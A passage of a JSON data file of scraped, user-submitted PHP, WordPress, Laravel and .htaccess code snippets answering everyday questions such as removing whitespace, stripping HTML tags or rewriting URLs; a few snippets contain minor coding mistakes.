    "description": "<?php if ( is_active_sidebar( 'your-sidebar-slug' ) ) { ?>     <ul id=\"sidebar\">         <?php dynamic_sidebar('your-sidebar-slug'); ?>     </ul> <?php } ?>\n/**  * Add a sidebar.  */ function wpdocs_theme_slug_widgets_init() {     register_sidebar( array(         'name'          => __( 'Main Sidebar', 'textdomain' ),         'id'            => 'sidebar-1',         'description'   => __( 'Widgets in this area will be shown on all posts and pages.', 'textdomain' ),         'before_widget' => '<li id=\"%1$s\" class=\"widget %2$s\">',         'after_widget'  => '</li>',         'before_title'  => '<h2 class=\"widgettitle\">',         'after_title'   => '</h2>',     ) ); }\n",
    "reg_date": "2021-10-12T10:19:58.000Z"
  },
  {
    "id": 4542,
    "keyword": null,
    "link": null,
    "title": " registration welcome email laravel",
    "description": "use Illuminate\\Support\\Facades\\Mail;  protected function create(array $data) {     $user = User::create([         'name' => $data['name'],         'email' => $data['email'],         'password' => Hash::make($data['password']),     ]);      // email data     $email_data = array(         'name' => $data['name'],         'email' => $data['email'],     );      // send email with the template     Mail::send('welcome_email', $email_data, function ($message) use ($email_data) {         $message->to($email_data['email'], $email_data['name'])             ->subject('Welcome to MyNotePaper')             ->from('info@mynotepaper.com', 'MyNotePaper');     });      return $user; }\nMAIL_DRIVER=smtp MAIL_HOST=smtp.mailtrap.io MAIL_PORT=2525 MAIL_USERNAME=48664******** MAIL_PASSWORD=6cfa6********\nHello {{ $name }},<br><br>  Welcome to MyNotePaper.<br><br>  Thank You,<br> MyNotepaper\n",
    "reg_date": "2021-10-12T10:19:58.000Z"
  },
  {
    "id": 4543,
    "keyword": null,
    "link": null,
    "title": " reindex array php",
    "description": "# starts from 0 $iZero = array_values($arr); # starts from 1 $iOne = array_combine(range(1, count($arr)), array_values($arr)); \n",
    "reg_date": "2021-10-12T10:19:58.000Z"
  },
  {
    "id": 4544,
    "keyword": null,
    "link": null,
    "title": " relative path php",
    "description": "define('ROOT_PATH', dirname(__DIR__) . '/'); include(ROOT_PATH.'config.php');\n",
    "reg_date": "2021-10-12T10:19:58.000Z"
  },
  {
    "id": 4545,
    "keyword": null,
    "link": null,
    "title": " reload page in php",
    "description": "//Refreshes your current page header(\"Refresh:0\"); header(\"Refresh:2\"); // Refreshes after 2 seconds  //If you need to redirect it to another page header(\"Refresh:0; url=page2.php\");\nheader(\"Refresh:0\");\n",
    "reg_date": "2021-10-12T10:19:58.000Z"
  },
  {
    "id": 4546,
    "keyword": null,
    "link": null,
    "title": " remove .php extension",
    "description": "#This code will automatically remove .php extention #ex: it remmoves www.eample.com/xyz.php to www.example.com/xyz RewriteEngine on RewriteBase / RewriteRule ^(.+)\\.php$ /$1 [R,L] RewriteCond %{REQUEST_FILENAME}.php -f RewriteRule ^(.*?)/?$ /$1.php [NC,END]  #Copy and paste the above code in .htaccess file \n",
    "reg_date": "2021-10-12T10:19:58.000Z"
  },
  {
    "id": 4547,
    "keyword": null,
    "link": null,
    "title": " remove .php from url",
    "description": "//put this piece of code in the root file .htaccess RewriteEngine on #remove extension html RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_FILENAME}\\.html -f RewriteRule ^(.*)$ $1.html [NC,L]  #remove extension php RewriteCond %{REQUEST_FILENAME} !-d  RewriteCond %{REQUEST_FILENAME}\\.php -f  RewriteRule ^(.*)$ $1.php\necho strip_tags(\"Hello <b>world!</b>\");\n# Apache Rewrite Rules  <IfModule mod_rewrite.c>   Options +FollowSymLinks   RewriteEngine On   RewriteBase /  # Add trailing slash to url   RewriteCond %{REQUEST_FILENAME} !-f   RewriteCond %{REQUEST_URI} !(\\.[a-zA-Z0-9]{1,5}|/|#(.*))$   RewriteRule ^(.*)$ $1/ [R=301,L]  # Remove .php-extension from url   RewriteCond %{REQUEST_FILENAME} !-d   RewriteCond %{REQUEST_FILENAME}\\.php -f   RewriteRule ^([^\\.]+)/$ $1.php   # End of Apache Rewrite Rules  </IfModule> \n",
    "reg_date": "2021-10-12T10:19:58.000Z"
  },
  {
    "id": 4548,
    "keyword": null,
    "link": null,
    "title": " remove 1 day from date in php",
    "description": "print('Next Date ' . date('Y-m-d', strtotime('-1 day', strtotime($date_raw))));\n",
    "reg_date": "2021-10-12T10:19:58.000Z"
  },
  {
    "id": 4549,
    "keyword": null,
    "link": null,
    "title": " remove action from theme wordpress",
    "description": "add_action( 'init', 'remove_my_action'); function remove_my_action() {      remove_action( 'woocommerce_before_shop_loop','storefront_sorting_wrapper',9 ); }\n",
    "reg_date": "2021-10-12T10:19:59.000Z"
  },
  {
    "id": 4550,
    "keyword": null,
    "link": null,
    "title": " remove add media button wordpress editor",
    "description": "add_filter( 'wp_editor_settings', function($settings) {   $settings['media_buttons']=FALSE;   return $settings; });\n",
    "reg_date": "2021-10-12T10:19:59.000Z"
  },
  {
    "id": 4551,
    "keyword": null,
    "link": null,
    "title": " remove admin bar wordpress front end",
    "description": "add_action('after_setup_theme', 'remove_admin_bar');   function remove_admin_bar() { if (!current_user_can('administrator') && !is_admin()) {   show_admin_bar(false); } } \n/* Disable WordPress Admin Bar for all users */ add_filter( 'show_admin_bar', '__return_false' ); \n",
    "reg_date": "2021-10-12T10:19:59.000Z"
  },
  {
    "id": 4552,
    "keyword": null,
    "link": null,
    "title": " remove all html codes using php",
    "description": "<?php   // Remove all html codes from a string   \t$html = '<p>I love <em>codes</em>.<br>We shall keep the learning going</p>'; \techo strip_tags($html); \techo '<br>'; \t// Remove specific html tag/s from a string \techo strip_tags($html, '<br>'); ?>\n",
    "reg_date": "2021-10-12T10:19:59.000Z"
  },
  {
    "id": 4553,
    "keyword": null,
    "link": null,
    "title": " remove all spaces php",
    "description": "<?php $stripped = str_replace(' ', '', \"10 1000 0000 000\"); echo $stripped;\n$string = preg_replace('/\\s+/', '', $string);\n$string = \"this is my     string\" $string = preg_replace('/\\s+/', '', $string); \nphpCopy<?php  $searchString = \" \"; $replaceString = \"\"; $originalString = \"This is a programming tutorial\";    $outputString = preg_replace('/\\s+/', '', $originalString);  echo(\"The original string is: $originalString \\n\");   echo(\"The string without spaces is: $outputString \\n\");  ?>  \nphpCopy<?php  $searchString = \" \"; $replaceString = \"\"; $originalString = \"This is a programming tutorial\";    $outputString = str_replace($searchString, $replaceString, $originalString);  echo(\"The original string is: $originalString \\n\");   echo(\"The string without spaces is: $outputString\");     ?>  \n",
    "reg_date": "2021-10-12T10:19:59.000Z"
  },
  {
    "id": 4554,
    "keyword": null,
    "link": null,
    "title": " remove array element php",
    "description": "$items = ['banana', 'apple'];  unset($items[0]);  var_dump($items); // ['apple']\n//Delete array items with unset(no re-index) or array_splice(re-index)  $colors = array(\"red\",\"blue\",\"green\");                               unset($colors[1]);//remove second element, do not re-index array    $colors = array(\"red\",\"blue\",\"green\");  array_splice($colors, 1, 1); //remove second element, re-index array\n$array = [0 => \"a\", 1 => \"b\", 2 => \"c\"]; unset($array[1]); //Key which you want to delete /* $array: [     [0] => a     [2] => c ] */ //OR $array = [0 => \"a\", 1 => \"b\", 2 => \"c\"]; array_splice($array, 1, 1);//Offset which you want to delet /* $array: [     [0] => a     [1] => c ] */\n$arr = array('a' => 1, 'b' => 2, 'c' => 3); unset($arr['b']);  // RESULT: array('a' => 1, 'c' => 3)  $arr = array(1, 2, 3); array_splice($arr, 1, 1);  // RESULT: array(0 => 1, 1 => 3)\nforeach ($items as $key =>$item){   if(condition){     unset($item[$key]);   } }\n//NO KEY supplied $message array(\"a\", \"b\", \"c\", \"d\"); $del_val = \"b\"; if (($key = array_search($del_val, $messages)) !== false) {     unset($messages[$key]); }\n",
    "reg_date": "2021-10-12T10:19:59.000Z"
  },
  {
    "id": 4555,
    "keyword": null,
    "link": null,
    "title": " remove comma in numeric in php",
    "description": "$var = 18,542.00; $var = intval(preg_replace('/[^\\d.]/', '', $var)); result :- 18542; or if you need float $var = floatval(preg_replace('/[^\\d.]/', '', $var)); result :- 18542.00; \n",
    "reg_date": "2021-10-12T10:19:59.000Z"
  },
  {
    "id": 4556,
    "keyword": null,
    "link": null,
    "title": " remove cookies php",
    "description": "if (isset($_COOKIE['key'])) {     unset($_COOKIE['key']);     setcookie('key', '', time() - 3600, '/'); // empty value and old timestamp }\nunset($_COOKIE['hello']);\n",
    "reg_date": "2021-10-12T10:19:59.000Z"
  },
  {
    "id": 4557,
    "keyword": null,
    "link": null,
    "title": " remove custom post type slug from url",
    "description": "function na_remove_slug( $post_link, $post, $leavename ) {      if ( 'events' != $post->post_type || 'publish' != $post->post_status ) {         return $post_link;     }      $post_link = str_replace( '/' . $post->post_type . '/', '/', $post_link );      return $post_link; } add_filter( 'post_type_link', 'na_remove_slug', 10, 3 );  function na_parse_request( $query ) {      if ( ! $query->is_main_query() || 2 != count( $query->query ) || ! isset( $query->query['page'] ) ) {         return;     }      if ( ! empty( $query->query['name'] ) ) {         $query->set( 'post_type', array( 'post', 'events', 'page' ) );     } } add_action( 'pre_get_posts', 'na_parse_request' );\n",
    "reg_date": "2021-10-12T10:19:59.000Z"
  },
  {
    "id": 4558,
    "keyword": null,
    "link": null,
    "title": " remove decimal php",
    "description": "$var = 252.587254564; $var = (int)$var; // 252\n(int)-1.2 \n",
    "reg_date": "2021-10-12T10:19:59.000Z"
  },
  {
    "id": 4559,
    "keyword": null,
    "link": null,
    "title": " remove double space php",
    "description": "$ro = preg_replace('/\\s+/', ' ',$row['message']);\n$string = \"this is my     string\" $string = preg_replace('/\\s+/', '', $string); \n",
    "reg_date": "2021-10-12T10:19:59.000Z"
  },
  {
    "id": 4560,
    "keyword": null,
    "link": null,
    "title": " remove duplicate values in array php",
    "description": "<?php $fruits_list = array('Orange',  'Apple', ' Banana', 'Cherry', ' Banana'); $result = array_unique($fruits_list); print_r($result); ?>    Output:  Array ( [0] => Orange [1] => Apple [2] => Banana [3] => Cherry ) \n <?php $input = array(\"a\" => \"green\", \"red\", \"b\" => \"green\", \"blue\", \"red\"); $result = array_unique($input); print_r($result); ?>  Array (     [a] => green     [0] => red     [1] => blue )\n<?php $a=array(\"a\"=>\"red\",\"b\"=>\"green\",\"c\"=>\"red\"); print_r(array_unique($a)); ?> Output : Array ( [a] => red [b] => green )  Example 2:   $array = array(1, 2, 2, 3); $array = array_unique($array);  Output : Array is now (1, 2, 3)      \n<?php $list_programming_language = array('C#',  'C++', 'PHP', 'C#', 'PHP'); $result = array_unique($list_programming_language); print_r($result); ?>    // ==> 'C#',  'C++', 'PHP'\n<?php $input = array(\"a\" => \"green\", \"red\", \"b\" => \"green\", \"blue\", \"red\"); $result = array_unique($input); print_r($result); ?>  Array (     [a] => green     [0] => red     [1] => blue )\nWe used this to de-duplicate results from a variety of overlapping queries.  $input = array_map(\"unserialize\", array_unique(array_map(\"serialize\", $input))); \n",
    "reg_date": "2021-10-12T10:20:00.000Z"
  },
  {
    "id": 4561,
    "keyword": null,
    "link": null,
    "title": " remove element from xml on php",
    "description": "<?php  $doc = new DOMDocument;  $doc->load('theFile.xml');  $thedocument = $doc->documentElement;  //this gives you a list of the messages $list = $thedocument->getElementsByTagName('message');  //figure out which ones you want -- assign it to a variable (ie: $nodeToRemove ) $nodeToRemove = null; foreach ($list as $domElement){   $attrValue = $domElement->getAttribute('time');   if ($attrValue == 'VALUEYOUCAREABOUT') {     $nodeToRemove = $domElement; //will only remember last one- but this is just an example :)   } }  //Now remove it. if ($nodeToRemove != null) $thedocument->removeChild($nodeToRemove);  echo $doc->saveXML();  ?>\n",
    "reg_date": "2021-10-12T10:20:00.000Z"
  },
  {
    "id": 4562,
    "keyword": null,
    "link": null,
    "title": " remove empty array elements php",
    "description": "<?php $arr = array('1', '', '2', '3', '0'); // Incorrect: print_r(array_filter($arr)); // Correct: print_r(array_filter($arr, 'strlen')); //Custom print_r(array_filter($arr, function ($val) {if ($val > 0) {return true;} else {return false;}}));\n$colors = array(\"red\",\"\",\"blue\",NULL);  $colorsNoEmptyOrNull = array_filter($colors, function($v){   return !is_null($v) && $v !== '';  }); //$colorsNoEmptyOrNull is now [\"red\",\"blue\"]\n",
    "reg_date": "2021-10-12T10:20:00.000Z"
  },
  {
    "id": 4563,
    "keyword": null,
    "link": null,
    "title": " remove every whitespace php",
    "description": "$string = preg_replace('/\\s+/', '', $string);\n//remove all white spaces from a string $whatonearth=preg_replace('/\\s/','',\"what o n   ear th\");\n",
    "reg_date": "2021-10-12T10:20:00.000Z"
  },
  {
    "id": 4564,
    "keyword": null,
    "link": null,
    "title": " remove first element in array php",
    "description": "<?php echo substr('abcdef', 1);     // bcdef ?>\n<?php $stack = array(\"orange\", \"banana\", \"apple\", \"raspberry\"); $fruit = array_shift($stack); print_r($stack); ?>   // Array // ( //     [0] => banana //     [1] => apple //     [2] => raspberry // )\n$arr = [1,2,3,4]; array_shift($arr); print_r($arr); // [2,3,4]\n",
    "reg_date": "2021-10-12T10:20:00.000Z"
  },
  {
    "id": 4565,
    "keyword": null,
    "link": null,
    "title": " remove first letter php",
    "description": "<?php echo substr('abcdef', 1);     // bcdef ?>\n$str = \"The quick brown fox jumps over the lazy dog.\" $str2 = substr($str, 4); // \"quick brown fox jumps over the lazy dog.\" \n$str = substr($str, 1);\n$arr = [1,2,3,4]; array_shift($arr); print_r($arr); // [2,3,4]\n",
    "reg_date": "2021-10-12T10:20:00.000Z"
  },
  {
    "id": 4566,
    "keyword": null,
    "link": null,
    "title": " remove fromc ollection",
    "description": "collection->forget($key);\n",
    "reg_date": "2021-10-12T10:20:00.000Z"
  },
  {
    "id": 4567,
    "keyword": null,
    "link": null,
    "title": " remove get parameters from url php",
    "description": "function strip_param_from_url( $url, $param ) {     $base_url = strtok($url, '?');              // Get the base url     $parsed_url = parse_url($url);              // Parse it      $query = $parsed_url['query'];              // Get the query string     parse_str( $query, $parameters );           // Convert Parameters into array     unset( $parameters[$param] );               // Delete the one you want     $new_query = http_build_query($parameters); // Rebuilt query string     return $base_url.'?'.$new_query;            // Finally url is ready } // Usage echo strip_param_from_url( 'http://url.com/search/?location=london&page_number=1',  \t'location' )\n",
    "reg_date": "2021-10-12T10:20:00.000Z"
  },
  {
    "id": 4568,
    "keyword": null,
    "link": null,
    "title": " remove gutenberg styles",
    "description": "// Don't load Gutenberg-related stylesheets. add_action( 'wp_enqueue_scripts', 'remove_block_css', 100 ); function remove_block_css() { wp_dequeue_style( 'wp-block-library' ); // WordPress core wp_dequeue_style( 'wp-block-library-theme' ); // WordPress core wp_dequeue_style( 'wc-block-style' ); // WooCommerce wp_dequeue_style( 'storefront-gutenberg-blocks' ); // Storefront theme }\n",
    "reg_date": "2021-10-12T10:20:00.000Z"
  },
  {
    "id": 4569,
    "keyword": null,
    "link": null,
    "title": " remove html from string php",
    "description": "<?php \techo strip_tags(\"Hello <b>world!</b>\");\necho strip_tags(\"Hello <b>world!</b>\");\n<?php $text = '<p>Test paragraph.</p><!-- Comment --> <a href=\"#fragment\">Other text</a>'; echo strip_tags($text); //Test paragraph. Other text  // Allow <p> and <a> echo strip_tags($text, '<p><a>'); //<p>Test paragraph.</p> <a href=\"#fragment\">Other text</a> // as of PHP 7.4.0 the line above can be written as: // echo strip_tags($text, ['p', 'a']); ?>  \n",
    "reg_date": "2021-10-12T10:20:00.000Z"
  },
  {
    "id": 4570,
    "keyword": null,
    "link": null,
    "title": " remove html tags from a string except p in php",
    "description": "$text = '<div class=\"test\"><p>Clean <a href=\"#\">text</a><br><b>Bold</b> text</p></div>';  $cleanText = strip_tags($text, ['p','b','i','br']);\n",
    "reg_date": "2021-10-12T10:20:00.000Z"
  },
  {
    "id": 4571,
    "keyword": null,
    "link": null,
    "title": " remove html tags from string php",
    "description": "<?php \techo strip_tags(\"Hello <b>world!</b>\");\n // using strip_tags and str_replace for REMOVE all html TAGS in php $text = '<p>Hello world.</p><!-- Comment --> <a href=\"https://learn-tech-tips.blogspot.com\">Zidane</a>'; echo strip_tags($text);  //Hello world. Zidane  $short_description = strip_tags(str_replace(\"&nbsp;\", \" \", $short_description)); echo $short_description       // Allow <p> and <a> echo strip_tags($text, '<p><a>');    // <p>Hello world.</p><a href=\"https://learn-tech-tips.blogspot.com\">Zidane</a>\necho $new_string = preg_replace('/<span[^>]+\\>/i', '', $content); \necho strip_tags(\"Hello <b>world!</b>\");\n<?php $text = '<p>Test paragraph.</p><!-- Comment --> <a href=\"#fragment\">Other text</a>'; echo strip_tags($text); //Test paragraph. Other text  // Allow <p> and <a> echo strip_tags($text, '<p><a>'); //<p>Test paragraph.</p> <a href=\"#fragment\">Other text</a> // as of PHP 7.4.0 the line above can be written as: // echo strip_tags($text, ['p', 'a']); ?>  \n<?php $str = \"<h1>Hello World&AElig;&Oslash;&Aring;!</h1>\"; # Remove all HTML tags and all characters with ASCII value > 127, from a string: $newstr = filter_var($str, FILTER_SANITIZE_STRING, FILTER_FLAG_STRIP_HIGH); echo $newstr; # Result: Hello World!\n",
    "reg_date": "2021-10-12T10:20:01.000Z"
  },
  {
    "id": 4572,
    "keyword": null,
    "link": null,
    "title": " remove html tags php",
    "description": "<?php \techo strip_tags(\"Hello <b>world!</b>\");\n // using strip_tags and str_replace for REMOVE all html TAGS in php $text = '<p>Hello world.</p><!-- Comment --> <a href=\"https://learn-tech-tips.blogspot.com\">Zidane</a>'; echo strip_tags($text);  //Hello world. Zidane  $short_description = strip_tags(str_replace(\"&nbsp;\", \" \", $short_description)); echo $short_description       // Allow <p> and <a> echo strip_tags($text, '<p><a>');    // <p>Hello world.</p><a href=\"https://learn-tech-tips.blogspot.com\">Zidane</a>\necho strip_tags(\"Hello <b>world!</b>\");\n<?php $text = '<p>Test paragraph.</p><!-- Comment --> <a href=\"#fragment\">Other text</a>'; echo strip_tags($text); //Test paragraph. Other text  // Allow <p> and <a> echo strip_tags($text, '<p><a>'); //<p>Test paragraph.</p> <a href=\"#fragment\">Other text</a> // as of PHP 7.4.0 the line above can be written as: // echo strip_tags($text, ['p', 'a']); ?>  \n<?php $str = \"<h1>Hello World&AElig;&Oslash;&Aring;!</h1>\"; # Remove all HTML tags and all characters with ASCII value > 127, from a string: $newstr = filter_var($str, FILTER_SANITIZE_STRING, FILTER_FLAG_STRIP_HIGH); echo $newstr; # Result: Hello World!\n",
    "reg_date": "2021-10-12T10:20:01.000Z"
  },
  {
    "id": 4573,
    "keyword": null,
    "link": null,
    "title": " remove http / https from link php",
    "description": "function remove_http($url) {    $disallowed = array('http://', 'https://');    foreach($disallowed as $d) {       if(strpos($url, $d) === 0) {          return str_replace($d, '', $url);       }    }    return $url; }\n",
    "reg_date": "2021-10-12T10:20:01.000Z"
  },
  {
    "id": 4574,
    "keyword": null,
    "link": null,
    "title": " remove index.php",
    "description": "<?php  #By default, the index.php file will be included in your URLs:    # Create a .htaccess file in your root folder and paste the below code  RewriteEngine On RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ index.php/$1 [L] ?>\n#in apache mod rewrite is disabled a2enmod rewrite\n",
    "reg_date": "2021-10-12T10:20:01.000Z"
  },
  {
    "id": 4575,
    "keyword": null,
    "link": null,
    "title": " remove index.php from url htaccess",
    "description": "<?php  #By default, the index.php file will be included in your URLs:    # Create a .htaccess file in your root folder and paste the below code  RewriteEngine On RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ index.php/$1 [L] ?>\nRewriteCond %{THE_REQUEST} ^GET.*index\\.php [NC]  RewriteRule (.*?)index\\.php/*(.*) /$1$2 [R=301,NE,L] \n",
    "reg_date": "2021-10-12T10:20:01.000Z"
  },
  {
    "id": 4576,
    "keyword": null,
    "link": null,
    "title": " remove index.php in codeigniter",
    "description": "<?php  #By default, the index.php file will be included in your URLs:    # Create a .htaccess file in your root folder and paste the below code  RewriteEngine On RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ index.php/$1 [L] ?>\n1. Change $config['index_page'] = \"index.php\" to $config['index_page'] = \"\" in config.php 2. Change $config['uri_protocol'] =\"AUTO\" to $config['uri_protocol'] = \"REQUEST_URI\" in config.php 3. Create .htaccess file in root dir of your application and paste the following code   \tRewriteEngine on \tRewriteCond $1 !^(index\\.php|resources|robots\\.txt) \tRewriteCond %{REQUEST_FILENAME} !-f \tRewriteCond %{REQUEST_FILENAME} !-d \tRewriteRule ^(.*)$ index.php/$1 [L,QSA]  \n#in apache mod rewrite is disabled a2enmod rewrite\nRewriteEngine on RewriteCond $1 !^(index\\.php|resources|robots\\.txt) RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ index.php/$1 [L,QSA] \n# Only for Nginx server location / {     try_files $uri $uri/ /index.php$is_args$args; }\n//find the below code    $config['index_page'] = \"index.php\"  //replace with the below code $config['index_page'] = \"\" \n",
    "reg_date": "2021-10-12T10:20:01.000Z"
  },
  {
    "id": 4577,
    "keyword": null,
    "link": null,
    "title": " remove item from collection",
    "description": "$collection = collect(['name' => 'taylor', 'framework' => 'laravel']);  // The forget method removes an item from the collection by its key: $collection->forget('name'); // The pull method removes and returns an item from the collection by its key: $collection->pull('name'); // The reject method filters the collection using the given closure. // The closure should return true if the item should be removed from the resulting collection: $filtered = $collection->reject(function ($value) {     return $value == 'taylor'; });\n",
    "reg_date": "2021-10-12T10:20:01.000Z"
  },
  {
    "id": 4578,
    "keyword": null,
    "link": null,
    "title": " remove item in an array php",
    "description": "$colors = array(\"blue\",\"green\",\"red\");  //delete element in array by value \"green\" if (($key = array_search(\"green\", $colors)) !== false) {     unset($colors[$key]); }\n//Delete array items with unset(no re-index) or array_splice(re-index)  $colors = array(\"red\",\"blue\",\"green\");                               unset($colors[1]);//remove second element, do not re-index array    $colors = array(\"red\",\"blue\",\"green\");  array_splice($colors, 1, 1); //remove second element, re-index array\n//NO KEY supplied $message array(\"a\", \"b\", \"c\", \"d\"); $del_val = \"b\"; if (($key = array_search($del_val, $messages)) !== false) {     unset($messages[$key]); }\n$array = [0 => \"a\", 1 => \"b\", 2 => \"c\"]; unset($array[1]);\n",
    "reg_date": "2021-10-12T10:20:02.000Z"
  },
  {
    "id": 4579,
    "keyword": null,
    "link": null,
    "title": " remove last character from string in php",
    "description": "//Remove the last character using substr $string = substr($string, 0, -1);\n<?php echo substr('abcdef',0, -1);     // abcde ?>\necho substr($string, 0, -3);\n$arrStr = 'Str1, Str2, str3, '; echo rtrim($arrStr, \", \"); //Str1, Str2, str3 echo substr_replace($arrStr, \"\", -2); //Str1, Str2, str3 echo substr($arrStr, 0, -2); // Str1, Str2, str3\n$newarraynama = rtrim($arraynama, \", \"); \nphpCopy<?php $mystring = \"This is a PHP program.\"; echo(\"This is the string before removal: $mystring\\n\"); $newstring = rtrim($mystring, \". \"); echo(\"This is the string after removal: $newstring\"); ?> \n",
    "reg_date": "2021-10-12T10:20:02.000Z"
  },
  {
    "id": 4580,
    "keyword": null,
    "link": null,
    "title": " remove last character from string php",
    "description": "//Remove the last character using substr $string = substr($string, 0, -1);\n<?php echo substr('abcdef',0, -1);     // abcde ?>\n$hell = substr('hello', 0, -1);\necho substr($string, 0, -3); \n$string = rtrim($string, ',');\n$newarraynama = rtrim($arraynama, \", \"); \n",
    "reg_date": "2021-10-12T10:20:02.000Z"
  },
  {
    "id": 4581,
    "keyword": null,
    "link": null,
    "title": " remove last comma from string php",
    "description": "rtrim($my_string, ','); \n$string = rtrim($string, ',');\necho substr($string, 0, -2);\n",
    "reg_date": "2021-10-12T10:20:02.000Z"
  },
  {
    "id": 4582,
    "keyword": null,
    "link": null,
    "title": " remove last letter php",
    "description": "//Remove the last character using substr $string = substr($string, 0, -1);\n<?php echo substr('abcdef',0, -1);     // abcde ?>\n<?php  $string = \"hello world\";  // create a substring starting 1 character from // the beginning and ending 1 character from the end $trimmed = substr($string, 1, -1);  echo $trimmed; // prints \"ello worl\"\n$hell = substr('hello', 0, -1);\necho substr($string, 0, -3); \necho substr('a,b,c,d,e,', 0, -1); # => 'a,b,c,d,e' \n",
    "reg_date": "2021-10-12T10:20:02.000Z"
  },
  {
    "id": 4583,
    "keyword": null,
    "link": null,
    "title": " remove line break html php",
    "description": "preg_replace( \"/\\r|\\n/\", \"\", $yourString );\n",
    "reg_date": "2021-10-12T10:20:02.000Z"
  },
  {
    "id": 4584,
    "keyword": null,
    "link": null,
    "title": " remove link from product name in woocommerce cart",
    "description": "add_filter( 'woocommerce_cart_item_permalink', '__return_null' );\n",
    "reg_date": "2021-10-12T10:20:02.000Z"
  },
  {
    "id": 4585,
    "keyword": null,
    "link": null,
    "title": " remove php 8 in ubuntu",
    "description": "$ sudo apt-get purge php7.*\nunistall php8\n",
    "reg_date": "2021-10-12T10:20:02.000Z"
  },
  {
    "id": 4586,
    "keyword": null,
    "link": null,
    "title": " remove phpmyadmin ubuntu 20.04 completely",
    "description": "&ldquo;uninstall phpmyadmin ubuntu 20.04&rdquo; Code Answer's #1. sudo apt-get purge phpmyadmin. or. sudo apt-get remove phpmyadmin. #2. sudo apt-get autoremove.\n",
    "reg_date": "2021-10-12T10:20:02.000Z"
  },
  {
    "id": 4587,
    "keyword": null,
    "link": null,
    "title": " remove repeated columns laravel",
    "description": "$unique = $collection->unique();\n",
    "reg_date": "2021-10-12T10:20:02.000Z"
  },
  {
    "id": 4588,
    "keyword": null,
    "link": null,
    "title": " remove slashes from json php",
    "description": "echo stripslashes('{\\\"test\\\":{\\\"test1\\\":{\\\"test1\\\":[{\\\"test2\\\":\\\"1\\\",\\\"test3\\\": \\\"foo\\\",\\\"test4\\\":\\\"bar\\\",\\\"test5\\\":\\\"test7\\\"}]}}}'); \njson_decode($val, true, JSON_UNESCAPED_SLASHES);\n",
    "reg_date": "2021-10-12T10:20:03.000Z"
  },
  {
    "id": 4589,
    "keyword": null,
    "link": null,
    "title": " remove space from start and end of string in php",
    "description": "<?php $stripped = str_replace(' ', '', \"10 1000 0000 000\"); echo $stripped;\n<?php $phone = preg_replace( '/\\s+/', '', \"01234 567890\" ); echo $phone;\n$words = '      my words     '; $words = trim($words); var_dump($words); // string(8) \"my words\" \n  $trimmed = trim($text); var_dump($trimmed);    \n",
    "reg_date": "2021-10-12T10:20:03.000Z"
  },
  {
    "id": 4590,
    "keyword": null,
    "link": null,
    "title": " remove space from string php",
    "description": "<?php $stripped = str_replace(' ', '', \"10 1000 0000 000\"); echo $stripped;\n<?php $phone = preg_replace( '/\\s+/', '', \"01234 567890\" ); echo $phone;\n$string = preg_replace('/\\s+/', '', $string);\n$words = '      my words     '; $words = trim($words); var_dump($words); // string(8) \"my words\" \n$string = \"this is my     string\" $string = preg_replace('/\\s+/', '', $string); \nphpCopy<?php  $searchString = \" \"; $replaceString = \"\"; $originalString = \"This is a programming tutorial\";    $outputString = preg_replace('/\\s+/', '', $originalString);  echo(\"The original string is: $originalString \\n\");   echo(\"The string without spaces is: $outputString \\n\");  ?>  \n",
    "reg_date": "2021-10-12T10:20:03.000Z"
  },
  {
    "id": 4591,
    "keyword": null,
    "link": null,
    "title": " remove spaces from string php",
    "description": "<?php $stripped = str_replace(' ', '', \"10 1000 0000 000\"); echo $stripped;\n<?php $phone = preg_replace( '/\\s+/', '', \"01234 567890\" ); echo $phone;\n$string = preg_replace('/\\s+/', '', $string);\n$string = \"this is my     string\" $string = preg_replace('/\\s+/', '', $string); \nphpCopy<?php  $searchString = \" \"; $replaceString = \"\"; $originalString = \"This is a programming tutorial\";    $outputString = preg_replace('/\\s+/', '', $originalString);  echo(\"The original string is: $originalString \\n\");   echo(\"The string without spaces is: $outputString \\n\");  ?>  \n$str = \"\\n\\n\\nHello World!\\n\\n\\n\"; echo \"With trim: \" . trim($str);\n",
    "reg_date": "2021-10-12T10:20:03.000Z"
  },
  {
    "id": 4592,
    "keyword": null,
    "link": null,
    "title": " remove storefront footer",
    "description": "// remove default storefront footer (credit) function pk_remove_storefront_footer() { \tremove_action('storefront_footer', 'storefront_credit', 20); } add_action('init', 'pk_remove_storefront_footer', 10);\n",
    "reg_date": "2021-10-12T10:20:03.000Z"
  },
  {
    "id": 4593,
    "keyword": null,
    "link": null,
    "title": " remove string after comma in php",
    "description": "$var = 18,542.00; $var = intval(preg_replace('/[^\\d.]/', '', $var)); result :- 18542; or if you need float $var = floatval(preg_replace('/[^\\d.]/', '', $var)); result :- 18542.00; \npreg_replace('/^([^,]*).*$/', '$1', $print); substr($string, 0, strrpos($string.\",\", \",\"));\n$print=preg_replace('/^([^,]*).*$/', '$1', $print);\n",
    "reg_date": "2021-10-12T10:20:03.000Z"
  },
  {
    "id": 4594,
    "keyword": null,
    "link": null,
    "title": " remove symbolsand spaces php",
    "description": "preg_replace('/[^A-Za-z0-9]/', \"\", $data)\n",
    "reg_date": "2021-10-12T10:20:03.000Z"
  },
  {
    "id": 4595,
    "keyword": null,
    "link": null,
    "title": " remove time from date php",
    "description": "$date = '2012-09-09 03:09:00';  $createDate = new DateTime($date);  $strip = $createDate->format('Y-m-d'); var_dump($strip); // string(10) \"2012-09-09\"  $now = new DateTime(); $difference = $now->diff($createDate, true); var_dump($difference);  /* object(DateInterval)#3 (8) {   [\"y\"]=>   int(0)   [\"m\"]=>   int(0)   [\"d\"]=>   int(7)   [\"h\"]=>   int(13)   [\"i\"]=>   int(4)   [\"s\"]=>   int(38)   [\"invert\"]=>   int(0)   [\"days\"]=>   int(7) } */\ndont use php, use Blazor!\n",
    "reg_date": "2021-10-12T10:20:03.000Z"
  },
  {
    "id": 4596,
    "keyword": null,
    "link": null,
    "title": " remove whitespace from string php",
